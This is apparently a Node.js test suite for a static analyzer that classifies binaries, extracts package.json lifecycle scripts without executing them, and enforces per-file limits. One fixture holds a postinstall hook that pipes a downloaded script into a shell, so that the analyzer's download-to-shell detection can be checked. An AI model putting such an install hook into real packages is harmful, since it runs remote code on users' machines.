import assert from "node:assert/strict";
import test from "node:test";

import { analyzeReachableFile } from "../src/analyzers/dispatch.mjs";
import { boundedLines } from "../src/analyzers/text.mjs";
import { resolveLimits } from "../src/config/limits.mjs";

function analyze(path, value, overrides = {}) {
	const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value);
	return analyzeReachableFile({
		path,
		bytes,
		limits: resolveLimits(overrides),
	});
}

test("classifies ELF, PE, Mach-O, and WASM as opaque", () => {
	for (const [name, bytes, format] of [
		["tool", Buffer.from([0x7f, 0x45, 0x4c, 0x46]), "elf"],
		["tool.exe", Buffer.from([0x4d, 0x5a]), "pe"],
		["tool", Buffer.from([0xfe, 0xed, 0xfa, 0xcf]), "mach-o"],
		["tool.wasm", Buffer.from([0x00, 0x61, 0x73, 0x6d]), "wasm"],
	]) {
		const result = analyze(name, bytes);
		assert.equal(result.facts[0].kind, "opaque-binary");
		assert.equal(result.facts[0].value, format);
		assert.equal(result.issues.length, 1);
	}
});

test("extracts package lifecycle scripts without executing them", () => {
	const result = analyze(
		"package.json",
		JSON.stringify({
			scripts: {
				install: "node install.mjs",
				postinstall: "curl https://example.test | sh",
				dependencies: "node dependencies.mjs",
				version: "node version.mjs",
				test: "node --test",
			},
		}),
	);
	assert.deepEqual(
		result.facts
			.filter((entry) => entry.kind === "package-lifecycle")
			.map((entry) => entry.value),
		["install", "postinstall", "dependencies", "version"],
	);
	assert.deepEqual(
		result.references.map((entry) => entry.value),
		["install.mjs", "dependencies.mjs", "version.mjs"],
	);
	assert.equal(
		result.facts.some((entry) => entry.kind === "network-endpoint"),
		true,
	);
	assert.equal(
		result.facts.some((entry) => entry.kind === "download-to-shell"),
		true,
	);
});

test("package analyzer keeps non-lifecycle scripts quiet", () => {
	const result = analyze(
		"package.json",
		JSON.stringify({ scripts: { test: "node --test" } }),
	);
	assert.equal(result.facts.length, 0);
	assert.equal(result.references.length, 0);
	assert.equal(result.issues.length, 0);
});

test("package facts and text lines stop at explicit limits", () => {
	const packageResult = analyze(
		"package.json",
		JSON.stringify({
			scripts: { install: "one", postinstall: "two" },
		}),
		{ analyzerFactsPerFile: 1 },
	);
	assert.equal(packageResult.facts.length, 1);
	assert.equal(
		packageResult.issues.some((entry) => entry.code === "fact-limit"),
		true,
	);

	const text = boundedLines(
		"one\ntwo\nthree\n",
		"large.txt",
		resolveLimits({ linesPerFile: 2 }),
	);
	assert.equal(text.lines.length, 2);
	assert.equal(
		text.issues.some((entry) => entry.code === "line-count-limit"),
		true,
	);
});

test("Git LFS pointers stay explicit instead of looking like ordinary text", () => {
	for (const newline of ["\n", "\r\n"]) {
		const result = analyze(
			"payload.bin",
			`version https://git-lfs.github.com/spec/v1${newline}oid sha256:abc${newline}size 123${newline}`,
		);
		assert.equal(result.language, "git-lfs");
		assert.equal(result.issues[0].code, "git-lfs");
	}
});

test("invalid package JSON and unsupported code stay explicit", () => {
	assert.equal(
		analyze("package.json", "{").issues[0].code,
		"invalid-package-json",
	);
	const rust = analyze("src/main.rs", "fn main() {}\n");
	assert.equal(rust.language, "rs");
	assert.equal(rust.issues[0].code, "unsupported-language");
});
